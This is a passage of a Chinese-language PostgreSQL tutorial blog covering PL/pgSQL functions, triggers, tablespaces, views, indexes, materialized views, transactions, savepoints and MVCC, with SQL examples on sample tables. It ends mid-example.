<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 优先玩一下plsql</span></span><br><span class="line"><span class="comment">-- $$可以理解为是一种特殊的单引号，避免你在declare，begin，end中使用单引号时，出现问题，</span></span><br><span class="line"><span class="comment">-- 需要在编写后，在$$之后添加上当前内容的语言。</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> test() <span class="keyword">returns</span> <span class="type">int</span> <span class="keyword">as</span> $$</span><br><span class="line"><span class="keyword">declare</span></span><br><span class="line">    money <span class="type">int</span> :<span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">return</span> money;</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line">$$ <span class="keyword">language</span> plpgsql;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> test();</span><br></pre></td></tr></table></figure>

<p>在简单了解了一下plpgsql的语法后，编写一个触发器函数。</p>
<p>触发器函数允许使用一些特殊变量</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">NEW</span></span><br><span class="line">数据类型是RECORD；该变量为行级触发器中的<span class="keyword">INSERT</span><span class="operator">/</span><span class="keyword">UPDATE</span>操作保持新数据行。在语句级别的触发器以及<span class="keyword">DELETE</span>操作，这个变量是<span class="keyword">null</span>。</span><br><span class="line"></span><br><span class="line"><span class="keyword">OLD</span></span><br><span class="line">数据类型是RECORD；该变量为行级触发器中的<span class="keyword">UPDATE</span><span class="operator">/</span><span class="keyword">DELETE</span>操作保持新数据行。在语句级别的触发器以及<span class="keyword">INSERT</span>操作，这个变量是<span class="keyword">null</span>。</span><br></pre></td></tr></table></figure>

<p>构建一个删除学生分数的触发器函数。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 构建一个删除学生分数的触发器函数。</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> trigger_function_delete_student_score() <span class="keyword">returns</span> <span class="keyword">trigger</span> <span class="keyword">as</span> $$</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">delete</span> <span class="keyword">from</span> score <span class="keyword">where</span> student_id <span class="operator">=</span> old.id;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">old</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line">$$ <span class="keyword">language</span> plpgsql;</span><br></pre></td></tr></table></figure>

<p>开始构建触发器，在学生信息表删除时，执行前面声明的触发器函数</p>
<p><img src="/./assets/20241011/014acdfd4b5d42b1b34049ca903befe2.png" alt="构建触发器"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> [ <span class="keyword">OR</span> REPLACE ] [ <span class="keyword">CONSTRAINT</span> ] <span class="keyword">TRIGGER</span> name &#123; BEFORE <span class="operator">|</span> AFTER <span class="operator">|</span> INSTEAD <span class="keyword">OF</span> &#125; &#123; event [ <span class="keyword">OR</span> ... ] &#125;</span><br><span class="line">    <span class="keyword">ON</span> table_name</span><br><span class="line">    [ <span class="keyword">FROM</span> referenced_table_name ]</span><br><span class="line">    [ <span class="keyword">NOT</span> DEFERRABLE <span class="operator">|</span> [ DEFERRABLE ] [ INITIALLY IMMEDIATE <span class="operator">|</span> INITIALLY DEFERRED ] ]</span><br><span class="line">    [ <span class="keyword">REFERENCING</span> &#123; &#123; <span class="keyword">OLD</span> <span class="operator">|</span> <span class="keyword">NEW</span> &#125; <span class="keyword">TABLE</span> [ <span class="keyword">AS</span> ] transition_relation_name &#125; [ ... ] ]</span><br><span class="line">    [ <span class="keyword">FOR</span> [ <span class="keyword">EACH</span> ] &#123; <span class="type">ROW</span> <span class="operator">|</span> STATEMENT &#125; ]</span><br><span class="line">    [ <span class="keyword">WHEN</span> ( <span class="keyword">condition</span> ) ]</span><br><span class="line">    <span class="keyword">EXECUTE</span> &#123; <span class="keyword">FUNCTION</span> <span class="operator">|</span> <span class="keyword">PROCEDURE</span> &#125; function_name ( arguments )</span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span> event can be <span class="keyword">one</span> <span class="keyword">of</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">INSERT</span></span><br><span class="line">    <span class="keyword">UPDATE</span> [ <span class="keyword">OF</span> column_name [, ... ] ]</span><br><span class="line">    <span class="keyword">DELETE</span></span><br><span class="line">    <span class="keyword">TRUNCATE</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>当 <code>CONSTRAINT</code>选项被指定，这个命令会创建一个 <em>约束触发器</em> 。这和一个常规触发器相同，不过触发该触发器的时机可以使用<a href="http://www.postgres.cn/docs/12/sql-set-constraints.html" title="SET CONSTRAINTS">SET CONSTRAINTS</a>调整。约束触发器必须是表上的 <code>AFTER ROW</code>触发器。它们可以在导致触发器事件的语句末尾被引发或者在包含该语句的事务末尾被引发。在后一种情况中，它们被称作是被 <em>延迟</em> 。一个待处理的延迟触发器的引发也可以使用 <code>SET CONSTRAINTS</code>立即强制发生。当约束触发器实现的约束被违背时，约束触发器应该抛出一个异常。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 编写触发器，指定在删除某一行学生信息时，触发当前触发器，执行触发器函数</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> trigger_student </span><br><span class="line">after </span><br><span class="line"><span class="keyword">delete</span> </span><br><span class="line"><span class="keyword">on</span> student </span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="type">row</span> </span><br><span class="line"><span class="keyword">execute</span> <span class="keyword">function</span> trigger_function_delete_student_score();</span><br><span class="line"><span class="comment">-- 测试效果</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> student;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> score;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> student <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<h1 id="表空间"><a href="#表空间" class="headerlink" title="表空间"></a>表空间</h1><p>在存储数据时，数据肯定要落到磁盘上，基于构建的tablespace，指定数据存放在磁盘上的物理地址。</p>
<p>如果没有自己设计tablespace，PostgreSQL会自动指定一个位置作为默认的存储点。</p>
<p>可以通过一个函数，查看表的物理数据存放在了哪个磁盘路径下。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询表存储的物理地址</span></span><br><span class="line"><span class="keyword">select</span> pg_relation_filepath(<span class="string">&#x27;student&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241011/56d9d4819d2a4fc4acb4016755a964aa.png" alt="表空间"></p>
<p>这个位置是在$PG_DATA后的存放地址</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$PG_DATA <span class="operator">=</span><span class="operator">=</span> <span class="operator">/</span>var<span class="operator">/</span>lib<span class="operator">/</span>pgsql<span class="operator">/</span><span class="number">12</span><span class="operator">/</span>data<span class="operator">/</span></span><br></pre></td></tr></table></figure>

<p>41000就是存储数据的物理文件</p>
<p>构建表空间，指定数据存放位置</p>
<p><img src="/./assets/20241011/135df3ee6c70451f9764918675e4dec8.png" alt="构建表空间"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 构建表空间,构建表空间需要用户权限是超级管理员，其次需要指定的目录已经存在</span><br><span class="line">create tablespace tp_test location &#x27;/var/lib/pgsql/12/tp_test&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241011/705b0b089c254e179c2020484b414dbb.png" alt="构建表空间"></p>
<p>构建数据库，以及表，指定到这个表空间中</p>
<p><img src="/./assets/20241011/53e08b0b4e284a2eb021a0793aaf5b67.png" alt="构建数据库和表"></p>
<p>其实指定表空间的存储位置后，PostgreSQL会在$PG_DATA目录下存储一份，同时在咱们构建tablespace时，指定的路径下也存储一份。</p>
<p>这两个绝对路径下的文件都有存储表中的数据信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgsql/12/data/pg_tblspc/41015/PG_12_201909212/41016/41020</span><br><span class="line">/var/lib/pgsql/12/lz_tp_test/PG_12_201909212/41016/41020</span><br></pre></td></tr></table></figure>

<p>进一步会发现，其实在PostgreSQL的默认目录下，存储的是一个link，连接文件，类似一个快捷方式</p>
<p><img src="/./assets/20241011/6b8050fb7bde425f99a9f9b7693c7216.png" alt="文件链接"></p>
<h1 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h1><p>跟MySQL的没啥区别，把一些复杂的操作封装起来，还可以隐藏一些敏感数据。</p>
<p>视图对于用户来说，就是一张真实的表，可以直接基于视图查询一张或者多张表的信息。</p>
<p>视图对于开发来说，就是一条SQL语句。</p>
<p><img src="/./assets/20241011/92ede98fe99b4d5680b5e5aab4cf1fc6.png" alt="创建视图语法"></p>
<p>在PostgreSQL中，简单（单表）的视图是允许写操作的。</p>
<p>但是强烈不推荐对视图进行写操作，虽然PostgreSQL默认允许（简单的视图）。</p>
<p>写入的时候，其实修改的是表本身</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 构建一个简单视图</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> vw_score <span class="keyword">as</span> </span><br><span class="line">(<span class="keyword">select</span> id,math_score <span class="keyword">from</span> score);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> vw_score;</span><br><span class="line"><span class="keyword">update</span> vw_score <span class="keyword">set</span> math_score <span class="operator">=</span> <span class="number">99</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>多表视图</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 复杂视图(两张表关联)</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> vw_student_score <span class="keyword">as</span> </span><br><span class="line">(<span class="keyword">select</span> stu.id <span class="keyword">as</span> id ,stu.name <span class="keyword">as</span> name ,score.math_score <span class="keyword">from</span> student stu,score score <span class="keyword">where</span> stu.id <span class="operator">=</span> score.student_id);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> vw_student_score;</span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span> vw_student_score <span class="keyword">set</span> math_score <span class="operator">=</span><span class="number">999</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/./assets/20241011/77126d2759c04ce383e95d2c97f42021.png" alt="多表视图不许修改"></p>
<h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>索引是数据库中快速查询数据的方法。</p>
<p>索引能提升查询效率的同时，也会带来一些问题</p>
<ul>
<li>增加了存储空间；</li>
<li>写操作时，花费的时间比较多。</li>
</ul>
<p>索引可以提升效率，甚至还可以给字段做一些约束</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul>
<li>B-Tree索引：最常用的索引；</li>
<li>Hash索引：跟MySQL类似，做等值判断；</li>
<li>GIN索引：针对字段的多个值的类型，比如数组类型。</li>
</ul>
<h2 id="创建索引看效果"><a href="#创建索引看效果" class="headerlink" title="创建索引看效果"></a>创建索引看效果</h2><p><img src="/./assets/20241011/c66251ffd1ff44e6afa963c371214790.png" alt="索引创建语法"></p>
<p>准备大量测试数据，方便查看索引效果</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 测试索引效果</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tb_index(</span><br><span class="line">    id bigserial <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">64</span>),</span><br><span class="line">    phone <span class="type">varchar</span>(<span class="number">64</span>)[]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 添加300W条数据测试效果</span></span><br><span class="line">do $$</span><br><span class="line"><span class="keyword">declare</span></span><br><span class="line">    i <span class="type">int</span> :<span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">    while i <span class="operator">&lt;</span> <span class="number">3000000</span> loop</span><br><span class="line">        i <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">insert</span> <span class="keyword">into</span></span><br><span class="line">            tb_index</span><br><span class="line">        (name,phone) </span><br><span class="line">            <span class="keyword">values</span></span><br><span class="line">        (md5(random()::text <span class="operator">||</span> <span class="built_in">current_timestamp</span>::text)::uuid,<span class="keyword">array</span>[random()::<span class="type">varchar</span>(<span class="number">64</span>),random()::<span class="type">varchar</span>(<span class="number">64</span>)]);</span><br><span class="line">    <span class="keyword">end</span> loop;</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line">$$ <span class="keyword">language</span> plpgsql;</span><br></pre></td></tr></table></figure>

<p>在没有索引的情况下，先基于name做等值查询，看时间，同时看执行计划</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- c0064192-1836-b019-c649-b368c2be31ca</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_index <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2222222</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_index <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;c0064192-1836-b019-c649-b368c2be31ca&#x27;</span>;</span><br><span class="line">explain <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_index <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;c0064192-1836-b019-c649-b368c2be31ca&#x27;</span>;</span><br><span class="line"><span class="comment">-- Seq Scan  这个代表全表扫描</span></span><br><span class="line"><span class="comment">-- 时间大致0.3秒左右</span></span><br></pre></td></tr></table></figure>

<p>在有索引的情况下，再基于name做等值查询，看时间，同时看执行计划</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- name字段构建索引（默认就是b-tree）</span></span><br><span class="line"><span class="keyword">create</span> index index_tb_index_name <span class="keyword">on</span> tb_index(name);</span><br><span class="line"><span class="comment">-- 测试效果</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_index <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;c0064192-1836-b019-c649-b368c2be31ca&#x27;</span>;</span><br><span class="line">explain <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_index <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;c0064192-1836-b019-c649-b368c2be31ca&#x27;</span>;</span><br><span class="line"><span class="comment">-- Index Scan 使用索引</span></span><br><span class="line"><span class="comment">-- 0.1s左右</span></span><br></pre></td></tr></table></figure>

<p>测试GIN索引效果：</p>
<ul>
<li>在没有索引的情况下，基于phone字段做包含查询</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- phone：&#123;0.6925242730781953,0.8569644964711074&#125;</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_index <span class="keyword">where</span> phone @<span class="operator">&gt;</span> <span class="keyword">array</span>[<span class="string">&#x27;0.6925242730781953&#x27;</span>::<span class="type">varchar</span>(<span class="number">64</span>)];</span><br><span class="line">explain <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_index <span class="keyword">where</span> phone @<span class="operator">&gt;</span> <span class="keyword">array</span>[<span class="string">&#x27;0.6925242730781953&#x27;</span>::<span class="type">varchar</span>(<span class="number">64</span>)];</span><br><span class="line"><span class="comment">-- Seq Scan 全表扫描</span></span><br><span class="line"><span class="comment">-- 0.5s左右</span></span><br></pre></td></tr></table></figure>

<ul>
<li>给phone字段构建GIN索引，在查询</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 给phone字符串数组类型字段构建一个GIN索引</span></span><br><span class="line"><span class="keyword">create</span> index index_tb_index_phone_gin <span class="keyword">on</span> tb_index <span class="keyword">using</span> gin(phone);</span><br><span class="line"><span class="comment">-- 查询</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_index <span class="keyword">where</span> phone @<span class="operator">&gt;</span> <span class="keyword">array</span>[<span class="string">&#x27;0.6925242730781953&#x27;</span>::<span class="type">varchar</span>(<span class="number">64</span>)];</span><br><span class="line">explain <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tb_index <span class="keyword">where</span> phone @<span class="operator">&gt;</span> <span class="keyword">array</span>[<span class="string">&#x27;0.6925242730781953&#x27;</span>::<span class="type">varchar</span>(<span class="number">64</span>)];</span><br><span class="line"><span class="comment">-- Bitmap Index 位图扫描</span></span><br><span class="line"><span class="comment">-- 0.1s以内完成</span></span><br></pre></td></tr></table></figure>

<h1 id="物化视图"><a href="#物化视图" class="headerlink" title="物化视图"></a>物化视图</h1><p>前面说过普通视图，本质就是一个SQL语句，普通的视图并不会本地磁盘存储任何物理。 但是每次查询视图都是执行这个SQL。效率有点问题。</p>
<p>物化视图从名字上就可以看出来，必然是要持久化一份数据的，使用方法和视图基本一致。查询物化视图，就相当于查询一张单独的表。相比之前的普通视图，物化视图就不需要每次都查询复杂SQL，每次查询的都是真实的物理存储地址中的一份数据（表）。</p>
<p>物化视图因为会持久化到本地，完全脱离原来的表结构。 而且物化视图是可以单独设置索引等信息来提升物化视图的查询效率。</p>
<p>但是物化视图更新时间不太好把控。如果更新频繁，对数据库压力也不小。如果更新不频繁，会造成数据存在延迟问题，实时性就不好。</p>
<p>如果要更新物化视图，可以采用触发器的形式，当原表中的数据被写后，可以通过触发器执行同步物化视图的操作。或者基于定时任务去完成物化视图的数据同步。</p>
<p><img src="/./assets/20241011/15db0ad80b9247069b709f12b1fe0901.png" alt="物化视图创建语法"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 构建物化视图</span></span><br><span class="line"><span class="keyword">create</span> materialized <span class="keyword">view</span> mv_test <span class="keyword">as</span> (<span class="keyword">select</span> id,name,price <span class="keyword">from</span> test);</span><br><span class="line"><span class="comment">-- 操作物化视图和操作表的方式没啥区别。</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mv_test;</span><br><span class="line"><span class="comment">-- 操作原表时，对物化视图没任何影响</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test <span class="keyword">values</span> (<span class="number">4</span>,<span class="string">&#x27;月饼&#x27;</span>,<span class="number">50</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">-- 物化视图的添加操作(不允许写物化视图)，会报错</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mv_test <span class="keyword">values</span> (<span class="number">5</span>,<span class="string">&#x27;大阅兵&#x27;</span>,<span class="number">66</span>);</span><br></pre></td></tr></table></figure>

<p>物化视图如何从原表中进行同步操作？ PostgreSQL中，对物化视图的同步，提供了两种方式，一种是全量更新，另一种是增量更新。</p>
<p>全量更新语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询原来物化视图的数据</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mv_test;</span><br><span class="line"><span class="comment">-- 全量更新物化视图</span></span><br><span class="line">refresh materialized <span class="keyword">view</span> mv_test;</span><br><span class="line"><span class="comment">-- 再次查询物化视图的数据</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mv_test;</span><br></pre></td></tr></table></figure>

<p>增量更新，增量更新需要一个唯一标识，来判断哪些是增量，同时也会有行数据的版本号约束。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询原来物化视图的数据</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mv_test;</span><br><span class="line"><span class="comment">-- 增量更新物化视图，因为物化视图没有唯一索引，无法判断出哪些是增量数据</span></span><br><span class="line">refresh materialized <span class="keyword">view</span> concurrently mv_test;</span><br><span class="line"><span class="comment">-- 给物化视图添加唯一索引。</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> index index_mv_test <span class="keyword">on</span> mv_test(id);</span><br><span class="line"><span class="comment">-- 增量更新物化视图</span></span><br><span class="line">refresh materialized <span class="keyword">view</span> concurrently mv_test;</span><br><span class="line"><span class="comment">-- 再次查询物化视图的数据</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mv_test;</span><br><span class="line"><span class="comment">-- 增量更新时，即便是修改数据，物化视图的同步，也会根据一个xmin和xmax的字段做正常的数据同步</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">update</span> test <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;汤圆&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test <span class="keyword">values</span> (<span class="number">5</span>,<span class="string">&#x27;猪头肉&#x27;</span>,<span class="number">99</span>,<span class="number">40</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL事务</title>
    <url>/2024/10/11/20241011-05.html</url>
    <content><![CDATA[<h1 id="ACID"><a href="#ACID" class="headerlink" title="ACID"></a>ACID</h1><p>在日常操作中，对于一组相关操作，通常要求要么都成功，要么都失败。在关系型数据库中，称这一组操作为事务。为了保证整体事务的安全性，有ACID的概念：</p>
<ul>
<li>原子性A：事务是一个最小的执行单位，一次事务中的操作要么都成功，要么都失败。</li>
<li>一致性C：在事务完成时，所有数据必须保持在一致的状态。（事务完成后吗，最终结果和预期结果是一致的）</li>
<li>隔离性I：一次事务操作，要么是其他事务操作前的状态，要么是其他事务操作后的状态，不存在中间状态。</li>
<li>持久性D：事务提交后，数据会落到本地磁盘，修改是永久性的。</li>
</ul>
<p>PostgreSQL中，在事务的并发问题里，也是基于MVCC，多版本并发控制去维护数据的一致性。相比于传统的锁操作，MVCC最大的有点就是可以让读写互相不冲突。</p>
<p>当然，PostgreSQL也支持表锁和行锁，可以解决写写的冲突问题。</p>
<p>PostgreSQL相比于其他数据，有一个比较大的优化，DDL也可以包含在一个事务中。比如集群中的操作，一个事务可以保证多个节点都构建出一个表，才算成功。</p>
<h1 id="事务的基本使用"><a href="#事务的基本使用" class="headerlink" title="事务的基本使用"></a>事务的基本使用</h1><p>首先基于前面的各种操作，应该已经体会到了，PostgreSQL是自动提交事务，这跟MySQL是一样的。</p>
<p>可以基于关闭PostgreSQL的自动提交事务来进行操作。</p>
<p><img src="/./assets/20241011/8242ac908f9b458fa483140b0ee93307.png" alt="事务"></p>
<p>但是上述方式比较麻烦，传统的方式就三个命令：</p>
<ul>
<li>begin：开始事务</li>
<li>commit：提交事务</li>
<li>rollback：回滚事务</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 开启事务</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="comment">-- 操作</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test <span class="keyword">values</span> (<span class="number">7</span>,<span class="string">&#x27;bbb&#x27;</span>,<span class="number">12</span>,<span class="number">5</span>);</span><br><span class="line"><span class="comment">-- 提交事务 </span></span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>

<h1 id="保存点"><a href="#保存点" class="headerlink" title="保存点"></a>保存点</h1><p>比如项目中有一个大事务操作，不好控制，超时有影响，回滚会造成一切重来，成本太高。</p>
<p>我针对大事务，拆分成几个部分，第一部分完成后，构建一个保存点。如果后面操作失败了，需要回滚，不需要全盘回滚，回滚到之前的保存点，继续重试。</p>
<p>保存点似乎破坏了整体事务的原子性，但是只要操作合理，可以在保存点的举出上，做重试，只要重试不成功，依然可以全盘回滚。</p>
<p>比如一个电商项目，下订单，扣库存，创建订单，删除购物车，增加用户积分，通知商家等等，这个就是一个大事务。可以将扣库存和下订单这种核心功能完成后，增加一个保存点，如果说后续操作有失败的，可以从创建订单成功后的阶段，再做重试。</p>
<p>不过其实上述的业务，基于最终一致性有更好的处理方式，可以保证可用性。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- savepoint操作</span></span><br><span class="line"><span class="comment">-- 开启事务</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="comment">-- 插入一条数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test <span class="keyword">values</span> (<span class="number">8</span>,<span class="string">&#x27;铃铛&#x27;</span>,<span class="number">55</span>,<span class="number">11</span>);</span><br><span class="line"><span class="comment">-- 添加一个保存点</span></span><br><span class="line"><span class="keyword">savepoint</span> ok1;</span><br><span class="line"><span class="comment">-- 再插入数据,比如出了一场</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test <span class="keyword">values</span> (<span class="number">9</span>,<span class="string">&#x27;大唐官府&#x27;</span>,<span class="number">66</span>,<span class="number">22</span>);</span><br><span class="line"><span class="comment">-- 回滚到之前的提交点</span></span><br><span class="line"><span class="keyword">rollback</span> <span class="keyword">to</span> <span class="keyword">savepoint</span> ok1;</span><br><span class="line"><span class="comment">-- 就可以开始重试操作，重试成功，commit，失败可以rollback;</span></span><br><span class="line"><span class="keyword">commit</span>;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PostgreSQL并发问题</title>
    <url>/2024/10/12/20241012-01.html</url>
    <content><![CDATA[<h1 id="事务的隔离级别"><a href="#事务的隔离级别" class="headerlink" title="事务的隔离级别"></a>事务的隔离级别</h1><p>在不考虑隔离性的前提下，事务的并发可能会出现的问题：</p>
<ul>
<li>脏读：读到了其他事务未提交的数据（这种情况必须避免）。</li>
<li>不可重复读：同一事务中，多次查询同一数据，结果不一致，因为其他事务修改造成的（一些业务中不可重复读不是问题）。</li>
<li>幻读：同一事务中，多次查询同一数据，因为其他事务对数据进行了增删吗，导致出现了一些问题（一些业务中幻读不是问题）。</li>
</ul>
<p>针对这些并发问题，关系型数据库有一些事务的隔离级别，一般用4种。</p>
<ul>
<li>READ UNCOMMITTED：读未提交（啥用没有，并且PostgreSQL没有，提供了只是为了完整性）；</li>
<li>READ COMMITTED：读已提交，可以解决脏读（PostgreSQL默认隔离级别）；</li>
<li>REPEATABLE READ：可重复读，可以解决脏读和不可重复读（MySQL默认隔离级别，PostgreSQL也提供了，但是设置为可重复读，效果还是串行化）；</li>
<li>SERIALIZABLE：串行化，问题都解决了，使用了锁，效率慢。</li>
</ul>
<p>PostgreSQL在老版本中，只有两个隔离级别，读已提交和串行化，在PostgreSQL中就不存在脏读问题。</p>
<h1 id="MVCC"><a href="#MVCC" class="headerlink" title="MVCC"></a>MVCC</h1><p>如果一个数据库，频繁的进行读写操作，为了保证安全，采用锁的机制。但如果采用锁机制，如果一些事务在写数据，另外一个事务就无法读数据，会造成读写之间相互阻塞。 大多数的数据库都会采用 <strong>多版本并发控制MVCC</strong> 来解决这个问题。</p>
<p>比如你要查询一行数据，但是这行数据正在被修改，事务还没提交，如果此时对这行数据加锁，会导致其他的读操作阻塞，需要等待。如果采用PostgreSQL，他的内部会针对这一行数据保存多个版本，如果数据正在被写入，包就保存之前的数据版本。让读操作去查询之前的版本，不需要阻塞。等写操作的事务提交了，读操作才能查看到最新的数据。 这几个及时可以确保  <strong>读写操作没有冲突</strong> ，这个就是MVCC的主要特点。</p>
<p><strong>写写操作，和MVCC没关系，那个就是加锁的方式</strong>。</p>
<p>注意：这里的MVCC是基于读已提交的，如果是串行化，那就读不到了。</p>
<p>在操作之前，先了解一下PostgreSQL中，每条数据都会自带两个字段：</p>
<ul>
<li>xmin：给当前事务分配的数据版本。如果有其他事务做了写操作，并且提交事务了，就给xmin分配新的版本。</li>
<li>xmax：当前事务没有存在新版本，xmax就是0。如果有其他事务做了写操作，未提交事务，将写操作的版本放到xmax中。事务提交后，xmax会分配到xmin中，然后xmax归0。</li>
</ul>
<p><img src="/./assets/20241012/0d533d36a6a8489e877f092ef76e8141.png" alt="xmin与xmax"></p>
<p>基于上图的操作查看一波效果：</p>
<ul>
<li>事务A：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 左，事务A</span></span><br><span class="line"><span class="comment">--1、开启事务</span></span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="comment">--2、查询某一行数据,  xmin = 630,xmax = 0</span></span><br><span class="line"><span class="keyword">select</span> xmin,xmax,<span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line"><span class="comment">--3、每次开启事务后，会分配一个事务ID 事务id=631</span></span><br><span class="line"><span class="keyword">select</span> txid_current();</span><br><span class="line"><span class="comment">--7、修改id为8的数据，然后在本事务中查询   xmin = 631, xmax = 0</span></span><br><span class="line"><span class="keyword">update</span> test <span class="keyword">set</span> name <span class="operator">=</span> <span 